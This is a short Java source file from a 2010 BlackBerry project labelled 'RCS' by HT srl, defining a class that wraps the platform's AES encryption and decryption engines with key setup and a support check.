//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.crypto
 * File         : RimAES.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.crypto;

import net.rim.device.api.crypto.AESDecryptorEngine;
import net.rim.device.api.crypto.AESEncryptorEngine;
import net.rim.device.api.crypto.AESKey;
import net.rim.device.api.crypto.CryptoTokenException;
import net.rim.device.api.crypto.CryptoUnsupportedOperationException;

// TODO: Auto-generated Javadoc
/**
 * The Class RimAES.
 */
public final class RimAES implements CryptoEngine {

    /**
     * Checks if is supported.
     * 
     * @return true, if is supported
     */
    public static boolean isSupported() {
        final AESKey aeskey = new AESKey();

        try {
            final AESEncryptorEngine aesencrypt = new AESEncryptorEngine(aeskey);
        } catch (final CryptoTokenException e) {
            return false;
        } catch (final CryptoUnsupportedOperationException e) {
            return false;
        }

        return true;
    }

    AESKey aeskey;
    AESEncryptorEngine aesencrypt;

    AESDecryptorEngine aesdecrypt;

    /*
     * (non-Javadoc)
     * @see blackberry.crypto.CryptoEngine#decrypt(byte[], byte[])
     */
    public void decrypt(final byte[] ct, final byte[] pt)
            throws CryptoTokenException {
        aesdecrypt.decrypt(ct, 0, pt, 0);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.crypto.CryptoEngine#encrypt(byte[], byte[])
     */
    public void encrypt(final byte[] pt, final byte[] ct)
            throws CryptoTokenException {

        aesencrypt.encrypt(pt, 0, ct, 0);

    }

    /*
     * (non-Javadoc)
     * @see blackberry.crypto.CryptoEngine#makeKey(byte[], int)
     */
    public boolean makeKey(final byte[] cipherKey, final int keyBits) {
        aeskey = new AESKey(cipherKey, 0, keyBits);
        try {
            aesencrypt = new AESEncryptorEngine(aeskey);
            aesdecrypt = new AESDecryptorEngine(aeskey);

        } catch (final CryptoTokenException e) {
            return false;
        } catch (final CryptoUnsupportedOperationException e) {
            return false;
        }
        return true;
    }

}
